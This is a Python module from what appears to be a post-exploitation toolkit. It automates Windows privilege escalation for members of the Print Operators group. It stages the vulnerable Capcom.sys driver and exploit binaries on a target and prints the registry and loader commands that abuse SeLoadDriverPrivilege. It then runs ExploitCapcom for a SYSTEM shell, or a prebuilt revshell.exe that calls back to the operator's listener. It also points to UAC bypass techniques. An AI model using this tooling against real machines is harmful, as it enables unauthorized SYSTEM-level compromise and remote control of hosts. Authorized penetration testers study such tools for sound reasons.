from pathlib import Path

from core.paths import get_tools_dir
from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

TOOLS_DIR = get_tools_dir() / "printop"

CORE_TOOLS = ["Capcom.sys", "EoPLoadDriver.exe", "EnableSeLoadDriverPrivilege.exe", "DriverView.exe"]
GUI_TOOLS = ["ExploitCapcom.exe"]
HEADLESS_TOOLS = ["ExploitCapcomRev.exe", "revshell.exe"]


# ==========================================
# HELPERS
# ==========================================

def _header(mode_label):

    print(f"\n{B}┌── MODULE: PRINT OPERATORS " + "─" * 32 + f"┐{W}")
    print(f"{B}│{W} MODE: {C}{mode_label:<52}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True):

    raw = input(f"\n{B}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _existing(names):
    return [TOOLS_DIR / name for name in names if (TOOLS_DIR / name).is_file()]


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    gui = None

    if hasattr(args, "extra") and args.extra:
        candidate = args.extra[0].lower()
        if candidate in ("gui", "headless"):
            gui = candidate == "gui"

    if gui is None:
        gui = _ask("Interactive/GUI session on the target (RDP/console)? [Y/n]: ")

    mode_label = "GUI (ExploitCapcom.exe -> cmd.exe)" if gui else "Headless (ExploitCapcomRev.exe -> revshell.exe)"

    _header(mode_label)

    _section("Setup")

    binaries = _existing(CORE_TOOLS + (GUI_TOOLS if gui else HEADLESS_TOOLS))
    missing = [n for n in CORE_TOOLS + (GUI_TOOLS if gui else HEADLESS_TOOLS) if (TOOLS_DIR / n) not in binaries]

    if missing:
        print(f"{Y}[!] Missing from {TOOLS_DIR}: {', '.join(missing)} — obtain them manually.{W}")

    if binaries and _ask(f"Transfer {', '.join(p.name for p in binaries)} to target? [Y/n]: "):
        stage_windows_files(binaries)

    remote_dir = input(
        f"\n{B}[?]{W} Full absolute directory where the files landed on the target "
        f"[{C}{DEFAULT_REMOTE_DIR}{W}]: "
    ).strip() or DEFAULT_REMOTE_DIR

    capcom_path = f"{remote_dir}\\Capcom.sys"

    if not gui:
        print()
        print(f"    {B}[*]{W} revshell.exe is a pre-built static payload — its LHOST/LPORT are unknown from")
        print(f"        here. Test it or regenerate the ExploitCapcomRev/revshell.exe pair yourself if it")
        print(f"        doesn't call back to your listener.")

    _section("Execute on target")

    _step(
        1,
        "Confirm SeLoadDriverPrivilege is usable",
        "If whoami /priv doesn't show it at all, you're in an unelevated context — run the prompt "
        "\"as administrator\" (Print Operators creds), or bypass UAC first (UACMe has a full list of techniques).",
    )
    _cmd("whoami /priv")

    _step(
        2,
        "Enable the privilege and load Capcom.sys",
        "Only works pre-Windows 10 1803 / Server 2016 — HKCU driver registry refs are blocked after that.",
    )
    _cmd(
        f".\\EoPLoadDriver.exe System\\CurrentControlSet\\Capcom {capcom_path}",
        "# or manually — all 3 of these together do the same thing as the one line above:",
        f'reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d "\\??\\{capcom_path}"',
        "reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1",
        ".\\EnableSeLoadDriverPrivilege.exe",
    )

    _step(3, "Verify the driver actually loaded")
    _cmd(
        ".\\DriverView.exe /stext drivers.txt",
        "Get-Content drivers.txt | Select-String Capcom",
    )

    if gui:

        _step(4, "Exploit Capcom.sys for a SYSTEM shell")
        _cmd(".\\ExploitCapcom.exe")

    else:

        _step(
            4,
            "Start a listener, then exploit Capcom.sys",
            "revshell.exe fires when ExploitCapcomRev.exe runs — have your listener up first.",
        )
        _cmd(".\\ExploitCapcomRev.exe")

    _section("Cleanup — do this, this is destructive and expected to be reverted")

    _step(5, "Remove the registry key")
    _cmd("reg delete HKCU\\System\\CurrentControlSet\\CAPCOM /f")
